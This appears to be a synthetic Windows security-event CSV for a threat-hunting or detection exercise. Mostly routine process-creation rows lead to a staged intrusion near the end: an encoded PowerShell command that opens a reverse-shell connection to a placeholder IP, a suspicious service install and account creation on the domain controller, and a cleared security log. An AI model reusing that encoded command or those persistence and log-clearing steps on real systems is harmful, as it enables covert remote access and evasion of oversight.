TimeGenerated,Computer,EventID,Activity,Account,AccountType,AccountDomain,AccountName,TargetUserName,TargetDomainName,IpAddress,IpPort,LogonType,LogonProcessName,FailureReason,ProcessName,NewProcessName,ParentProcessName,CommandLine,ServiceName,ServiceFileName,EventSourceName,Channel,Type
2026-04-29T08:08:18Z,SVR-DC-01,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T08:39:29Z,WS-DEV-02,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T22:53:51Z,WS-DEV-02,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T01:39:13Z,WS-FINANCE-01,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T18:44:18Z,SVR-WEB-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T17:32:07Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T08:08:01Z,WS-FINANCE-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T04:11:43Z,WS-FINANCE-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T04:59:22Z,WS-DEV-02,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T18:20:15Z,WS-HR-03,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T23:34:09Z,WS-DEV-02,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T20:32:03Z,WS-DEV-02,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T12:04:21Z,WS-DEV-02,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T03:30:54Z,WS-HR-03,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T17:26:41Z,WS-DEV-02,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T01:05:12Z,WS-FINANCE-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T10:41:18Z,WS-DEV-02,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T17:07:22Z,WS-DEV-02,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T11:46:06Z,SVR-DC-01,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T01:45:21Z,SVR-WEB-01,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T18:54:22Z,WS-HR-03,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:15:07Z,WS-HR-03,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T04:38:56Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T04:20:27Z,SVR-WEB-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T07:31:09Z,WS-FINANCE-01,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T17:29:11Z,WS-DEV-02,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T06:39:49Z,WS-FINANCE-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T11:29:38Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T03:19:34Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T04:50:47Z,WS-DEV-02,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T08:34:16Z,SVR-DC-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T20:05:32Z,WS-HR-03,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T01:43:50Z,WS-DEV-02,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:04:05Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T21:03:00Z,WS-FINANCE-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T11:00:43Z,SVR-WEB-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T19:04:57Z,WS-DEV-02,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:14:31Z,WS-FINANCE-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T10:10:48Z,WS-FINANCE-01,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T17:56:20Z,WS-FINANCE-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T06:42:56Z,SVR-DC-01,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T17:08:49Z,WS-DEV-02,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T11:27:36Z,WS-FINANCE-01,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T22:26:22Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T05:55:07Z,WS-FINANCE-01,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T01:35:03Z,SVR-DC-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T16:35:52Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T21:25:43Z,WS-FINANCE-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T04:43:43Z,WS-HR-03,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T06:15:59Z,SVR-DC-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:15:12Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T18:09:14Z,SVR-WEB-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T20:37:09Z,SVR-DC-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T18:26:40Z,WS-FINANCE-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T17:02:20Z,SVR-WEB-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T06:41:08Z,SVR-DC-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T01:36:00Z,WS-DEV-02,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T17:13:13Z,WS-FINANCE-01,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T12:17:36Z,SVR-WEB-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:30:00Z,WS-DEV-02,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\explorer.exe,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:15:00Z,SVR-DC-01,4697,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,,,,UpdateSvc,C:\ProgramData\Microsoft\update_svc.exe,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:20:00Z,SVR-DC-01,4720,,CORP\bryce,User,CORP,bryce,contractor01,CORP,,,,,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:40:00Z,WS-HR-03,1102,,CORP\jadams,User,CORP,jadams,,,,,,,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
